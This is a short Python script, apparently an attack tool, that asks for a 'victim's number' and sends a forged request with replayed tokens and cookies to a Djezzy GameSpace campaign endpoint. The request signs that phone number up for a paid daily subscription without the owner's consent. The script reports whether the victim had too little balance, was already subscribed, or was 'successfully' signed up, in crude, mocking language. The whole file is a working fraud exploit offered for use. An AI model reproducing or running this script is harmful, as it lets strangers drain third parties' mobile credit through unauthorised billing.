import requests,os
E = '\033[1;31m'
B = '\033[2;36m'
G = '\033[1;32m'
S = '\033[1;33m'
os.system('clear')
print(f'''{B}{E}=============================={B}
|{G}[+] GitHub    : {B}whisper-666 |
|{G}[+] InstaGram : {B}_whisper.io_|
|{G}[+] TeleGram  : {B}whisper_io  |
{E}==============================''')
nmb=input(f"{G}[+] Victim's Number ==> {S}")
print(f'{E}==============================')
head={
    "Host": "dza.gamespace.co",
    "Connection": "keep-alive",
    "Content-Length": "224",
    "Cache-Control": "max-age\u003d0",
    "Upgrade-Insecure-Requests": "1",
    "Origin": "http://dza.gamespace.co",
    "Content-Type": "application/x-www-form-urlencoded",
    "User-Agent": "Mozilla/5.0 (Linux; Android 8.0.0; Plume L2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.88 Mobile Safari/537.36",
    "Accept": "text/html,application/xhtml+xml,application/xml;q\u003d0.9,image/avif,image/webp,image/apng,*/*;q\u003d0.8,application/signed-exchange;v\u003db3;q\u003d0.9",
    "Referer": "http://dza.gamespace.co/DjezzyD/Magic22Wifi?txId\u003dSMS\u0026afflid\u003dDjezzy\u0026refId\u003df2f83c90-1e0d-4644-8b0e-f598f4183be5\u0026pageId\u003d7\u0026msisdn\u003dfail\u0026pubid\u003dDjezzy\u0026offerName\u003dGamespace%20Daily",
    "Accept-Encoding": "gzip, deflate",
    "Accept-Language": "en-US,en;q\u003d0.9,ar-DZ;q\u003d0.8,ar;q\u003d0.7",
    "Cookie": "culture\u003d; _gid\u003dGA1.2.1684716976.1670168127; __RequestVerificationToken\u003dlUq2Pse_tEzJg4rmfbsMDg2NoC83woUY3zYgfWjgAjGbfhI2xDrhNuVvMYoNkVU9Ey18BB-LcEwsQpzaBSL-q17nxJWVyNjYeSVTcOld2To1; _ga\u003dGA1.1.102403884.1670168127; _ga_RGYNJ6RCHR\u003dGS1.1.1670170701.2.1.1670171168.0.0.0"}
data=f'__RequestVerificationToken=fc0U8TrfR6Gk1YYS_ftJmsvsXV1lJDToa4bo4jxqCmlNNXveHZqsYS_dkZrYwZwlK6_Bu8tPx6VzoRs4PMAcPqqHbpsAXvboYEn5ctpkV3g1&txId=SMS&afflid=Djezzy&pubid=Djezzy&pageId=7&offername=Gamespace+Daily&msisdn={nmb}'
res=requests.post('http://dza.gamespace.co/DjezzyD/CampaignRedirect',data=data,headers=head).text
if 'Your balance is low, please recharge you balance and try again.' in res:
 mes=res.split('tagline centerx show">')[1].split('</h1>')[0]
 print(f'{E}[×] {S}{nmb} {E}Have Less Than 25DA')
if 'User already subscribed to the GameSpace.' in res:
 mes=res.split('tagline centerx show">')[1].split('</h1>')[0]
 print(f'{E}[×] {S}{nmb} {E}Already Fucked')
if 'you are successfully subscribe' in res:
 print(f'{G}[√] You Fucked {B}{nmb} {G}Successfully')